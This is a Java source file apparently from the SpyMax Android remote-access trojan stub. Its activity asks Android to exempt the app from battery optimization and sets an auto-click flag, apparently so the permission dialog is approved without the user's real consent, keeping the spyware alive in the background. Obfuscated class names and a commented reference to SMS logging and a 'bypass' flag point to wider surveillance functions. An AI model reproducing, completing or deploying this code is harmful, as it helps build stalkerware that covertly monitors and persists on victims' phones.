package spymax.stub7;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;



public class _ask_battary_ extends Activity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {



            if (!ClassGen3.is_dozemode(this)) {
                try {

                    Intent intent1 = new
                            Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName()));
                    intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                    intent1.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);

                    startActivity(intent1);
                    ClassGen12.ClassGen12Auto_Click =true;
//                    if(_engine_wrk_.NeedSuper())
//                    {
//
//                    }

                   // ClassGen12.bypass =true;

                } catch (Exception ex) {
                }
            }
        }catch (Exception ex){
        //    utl.SettingsToAdd(this, consts.LogSMS , consts.string_140 + ex.toString() +consts.string_119);
        }
        finish();
    }
}
